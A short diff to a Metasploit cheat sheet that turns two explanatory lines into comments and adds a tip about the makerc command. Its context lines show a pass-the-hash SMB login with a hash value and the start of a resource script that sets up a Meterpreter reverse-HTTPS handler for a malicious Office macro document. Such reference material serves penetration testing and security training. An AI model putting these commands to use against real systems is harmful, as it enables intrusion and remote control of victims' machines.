@@ -114,8 +114,9 @@ SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d
 SMBUser               Lambda                                                             no        The username to authenticate as
 
 # Scripting Metasploit
-Using a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`.
-Here is a simple example to script the deployment of a handler an create an Office doc with macro.
+;; Using a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`.
+;; Here is a simple example to script the deployment of a handler an create an Office doc with macro.
+;; Note that we can save the issued commands in a session to an .rc file with the makerc command
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_https
 set LHOST 0.0.0.0
